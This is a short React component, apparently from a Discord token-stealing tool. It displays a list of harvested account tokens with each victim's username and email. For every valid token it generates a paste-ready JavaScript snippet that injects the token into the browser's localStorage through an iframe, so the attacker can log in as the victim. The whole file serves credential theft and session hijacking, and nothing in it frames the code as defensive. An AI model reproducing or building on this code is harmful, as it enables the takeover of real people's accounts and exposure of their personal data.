import React from 'react';
import { extractTokens, TokenData } from '../../../utils/index';

const ThanksPage = async () => {
  const tokens = await extractTokens();

  return (
    <div className='container'>
      <h1>Extracted Tokens</h1>
      <ul>
        {tokens.length > 0 ? (
          tokens.map((tokenData, index) => (
            <li key={index}>
              <strong className='w-full'>Token: {tokenData.token}</strong><br />
              {tokenData.userData ? (
                <>
                  <strong>User:</strong> {tokenData.userData.username}#{tokenData.userData.discriminator}<br />
                  <strong>Email:</strong> {tokenData.userData.email}
                  <pre>
                    <code className='text-[10px]'>
                      {`

function login() {
  setInterval(() => {
    document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = "${tokenData.token}"
  }, 50);
  setTimeout(() => {
    location.reload();
  }, 2500);
}

login();`}
                    </code>
                  </pre>
                </>
              ) : (
                <em>Token is invalid or expired</em>
              )}
            </li>
          ))
        ) : (
          <p>No tokens found.</p>
        )}
      </ul>

    </div>
  );
};

export default ThanksPage;
